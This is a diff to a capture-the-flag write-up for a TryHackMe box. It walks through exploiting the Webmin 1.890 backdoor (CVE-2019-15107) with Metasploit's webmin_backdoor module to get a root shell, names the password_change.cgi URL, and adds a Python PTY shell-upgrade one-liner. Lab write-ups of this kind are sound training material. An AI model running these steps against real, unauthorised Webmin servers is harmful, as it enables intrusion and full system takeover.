@@ -32,11 +32,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Findings:
  * Port 22 is running ssh, pretty normal
  * Port 10000 is not normally open, lets look into this:
-      * its running MiniServ 1.890 (Webmin httpd), lets check if this has any exploits!
+      * its running MiniServ 1.890 (Webmin httpd), let's check if this has any exploits
 
 ## Looking for exploits
 
-For ease of use, im just going to use metasploit and utilize the search command to try and find something:
+For ease of use, i'm just going to use metasploit and utilize the search command to try and find something:
 
 ```bash
 msf > search Webmin 1.890
@@ -55,7 +55,7 @@ Interact with a module by name or index. For example info 2, use 2 or use exploi
 After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'
 ```
 
-Perfect, we found something to try in metasploit
+Perfect, we found something to try in metasploit.
 
 ## Exploitation
 
@@ -117,7 +117,7 @@ msf exploit(linux/http/webmin_backdoor) >
 
 ```
 
-After setting the correct options, we run the module. 
+After setting the correct options, we run the module.
 
 ```bash
 msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.x.x.x.x
@@ -145,13 +145,14 @@ whoami
 root
 
 ```
-We had to set SSL to true because Webmin 1.890 runs over HTTPS by default, so Metasploit needs SSL enabled to communicate with it or it can't reach the backdoor url.
 
-Surprisingly easy, Metasploit is very powerful when it works!
+We had to set SSL to true because Webmin 1.890 runs over HTTPS by default, so metasploit needs SSL enabled to communicate with it or it can't reach the backdoor url. (http://10.x.x.x:10000/**password_change.cgi**)
+
+Surprisingly easy, metasploit is very powerful when it works!
 
 ## Finding Flags
 
-As root, this is trivial, but first lets secure our shell:
+As root, this is trivial, but first let's secure our shell:
 ```bash
 pwd
 /usr/share/webmin
@@ -161,6 +162,12 @@ whoami
 root
 root@source:/usr/share/webmin/# 
 ```
+
+Before exploring the system, we upgrade our raw (unstable) shell to a fully interactive TTY (more stable). The default reverse shell from Metasploit is non-interactive, so commands like su will hang and there's no tab completion or command history. Spawning a PTY with Python fixes this:
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+On boxes where Python isn't available, common fallbacks are script /dev/null -c bash or python3 instead of python. You can just google this too.
 
 Now we find the flags!
 
@@ -179,12 +186,12 @@ find . -name root.txt
 root@source:/# cat ./root/root.txt
 cat ./root/root.txt
 THM{XXXXXX_XXXX_XXXXXXX}
-root@source:/# 
+root@source:/# :)
 ```
 
 And done! (you have to find the flags for yourself)
 
-## Classification
+## Notes
 
 - This was actually CVE-2019-15107 - more here: https://nvd.nist.gov/vuln/detail/cve-2019-15107
 
